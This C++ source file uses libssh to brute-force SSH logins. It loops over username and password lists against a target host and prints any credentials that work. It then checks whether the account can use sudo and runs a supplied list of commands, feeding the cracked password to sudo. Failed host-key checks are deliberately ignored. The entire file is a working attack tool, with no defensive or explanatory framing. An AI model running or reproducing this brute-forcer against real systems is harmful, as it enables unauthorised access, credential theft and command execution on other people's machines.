//
// Created by adhokshajmishra on 28/4/20.
//
#include <libssh/libssh.h>
#include <iostream>
#include <cstring>
#include <fstream>
#include <vector>
#include <strings.h>

std::vector<std::string> ReadAllLines(const std::string& filename)
{
    std::vector<std::string> result;

    std::ifstream file(filename);
    if (file.bad() || file.fail())
    {
        file.close();
        return result;
    }

    std::string line;
    while (std::getline(file, line))
    {
        result.push_back(line);
    }
    file.close();
    return result;
}

int executeRemoteCommand(const ssh_session& session, const std::string& password,
        const std::string& command, std::string& output)
{
    ssh_channel channel;
    int rc;
    char buffer[256];
    int nbytes;

    channel = ssh_channel_new(session);
    if (channel == NULL)
        return SSH_ERROR;

    rc = ssh_channel_open_session(channel);
    if (rc != SSH_OK)
    {
        ssh_channel_free(channel);
        return rc;
    }

    rc = ssh_channel_request_exec(channel, command.c_str());
    if (rc != SSH_OK)
    {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return rc;
    }

    if (!password.empty()) {
        const char ret_key = '\n';
        ssh_channel_write(channel, password.c_str(), password.length());
        ssh_channel_write(channel, &ret_key, sizeof(ret_key));
    }
    nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
    output = "";
    while (nbytes > 0)
    {
        output.append(buffer, nbytes);
        nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
    }

    if (nbytes < 0)
    {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return SSH_ERROR;
    }

    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);

    return SSH_OK;
}

int verify_knownhost(ssh_session session) {
    enum ssh_known_hosts_e state;
    unsigned char *hash = NULL;
    ssh_key srv_pubkey = NULL;
    size_t hlen;
    char buf[10];
    char *hexa;
    char *p;
    int cmp;
    int rc;

    rc = ssh_get_server_publickey(session, &srv_pubkey);
    if (rc < 0) {
        return -1;
    }

    rc = ssh_get_publickey_hash(srv_pubkey,
                                SSH_PUBLICKEY_HASH_SHA1,
                                &hash,
                                &hlen);
    ssh_key_free(srv_pubkey);
    if (rc < 0) {
        return -1;
    }

    state = ssh_session_is_known_server(session);
    switch (state) {
        case SSH_KNOWN_HOSTS_OK:
            /* OK */

            break;
        case SSH_KNOWN_HOSTS_CHANGED:
            std::cerr << "Host key for server changed: it is now:" << std::endl;
            ssh_print_hexa("Public key hash", hash, hlen);
            std::cerr << "For security reasons, connection will be stopped" << std::endl;
            ssh_clean_pubkey_hash(&hash);
            return -1;
        case SSH_KNOWN_HOSTS_OTHER:
            std::cerr << "The host key for this server was not found but an other type of key exists." << std::endl;
            ssh_clean_pubkey_hash(&hash);
            return -1;
        case SSH_KNOWN_HOSTS_NOT_FOUND:
            std::cerr << "Could not find known host file." << std::endl;

            /* FALL THROUGH to SSH_SERVER_NOT_KNOWN behavior */

        case SSH_KNOWN_HOSTS_UNKNOWN:
            hexa = ssh_get_hexa(hash, hlen);
            std::cout << "The server is unknown. Do you trust the host key?" << std::endl;
            std::cout << "Public key hash: " << hexa << std::endl;
            ssh_string_free_char(hexa);
            ssh_clean_pubkey_hash(&hash);
            p = fgets(buf, sizeof(buf), stdin);
            if (p == NULL) {
                return -1;
            }

            cmp = strncasecmp(buf, "yes", 3);
            if (cmp != 0) {
                return -1;
            }

            rc = ssh_session_update_known_hosts(session);
            if (rc < 0) {
                std::cerr << "Error " << strerror(errno) << std::endl;
                return -1;
            }

            break;
        case SSH_KNOWN_HOSTS_ERROR:
            std::cerr << "Error " << ssh_get_error(session) << std::endl;
            ssh_clean_pubkey_hash(&hash);
            return -1;
    }

    ssh_clean_pubkey_hash(&hash);
    return 0;
}

bool isSudoAllowed(const ssh_session& session)
{
    bool result = false;
    std::string output;
    executeRemoteCommand(session, "", "groups", output);
    result = !(output.find(" sudo") == std::string::npos && output.find("sudo ") == std::string::npos);

    return result;
}

int main(int argc, char** argv)
{
    if (argc < 5)
    {
        std::cout << "Usage: " << argv[0]
        << " <host> <port> <username_list> <password_list> <command_list>" << std::endl;
        return -1;
    }

    std::string host = argv[1];
    int port = std::stoi(argv[2], nullptr, 10);
    std::vector<std::string> usernames = ReadAllLines(argv[3]);
    std::vector<std::string> passwords = ReadAllLines(argv[4]);
    std::vector<std::string> commands = ReadAllLines(argv[5]);

    ssh_session my_session = ssh_new();
    if (my_session == nullptr) {
        ssh_free(my_session);
        return -1;
    }

    int verbosity = SSH_LOG_NOLOG;
    //char host[] = "localhost";

    ssh_options_set(my_session, SSH_OPTIONS_HOST, host.c_str());
    ssh_options_set(my_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(my_session, SSH_OPTIONS_PORT, &port);

    int return_code;

    return_code = ssh_connect(my_session);

    if (return_code != SSH_OK)
    {
        std::cerr << "Error connecting to [" << host << ":" << port << "]: "
            << ssh_get_error_code(my_session) << std::endl;
        ssh_free(my_session);
        return -2;
    }

    if (verify_knownhost(my_session) < 0)
    {
        std::cerr << "Authenticity of host cannot be established" << std::endl;
        //ssh_disconnect(my_session);
        //ssh_free(my_session);
        //return -3;
    }

    //std::string username = "username", password = "password";
    std::cerr << "Brute-forcing SSH on " << host << ":" << port << std::endl;
    for (auto& username : usernames)
    {
        std::cerr << "##" << std::flush;
        for (auto& password : passwords)
        {
            std::cerr << "##" << std::flush;
            return_code = ssh_userauth_password(my_session, username.c_str(), password.c_str());

            if (return_code != SSH_AUTH_SUCCESS)
            {
                continue;
            }

            std::cerr << std::endl << "Successfully authenticated to [" << username << "@" << host << ":" << port << "]: "
                      << "[" << password << "]" << std::endl;
            std::string output;
            bool isSudo = isSudoAllowed(my_session);
            if (isSudo)
                std::cout << "USER IS ALLOWED TO SUDO!" << std::endl;
            else
                std::cout << "USER IS NOT ALLOWED TO SUDO!" << std::endl;

            for (auto& command : commands) {
                std::cout << std::endl << "Executing command: " << command << std::endl;

                if (command.rfind("sudo ") == 0 && isSudo) {
                    executeRemoteCommand(my_session, password, command, output);
                }
                else
                    executeRemoteCommand(my_session, "", command, output);
                std::cout << "Output: " << output << std::endl;
            }

            ssh_disconnect(my_session);
            ssh_free(my_session);
            return 0;
        }
    }

    ssh_disconnect(my_session);
    ssh_free(my_session);
    return 0;
}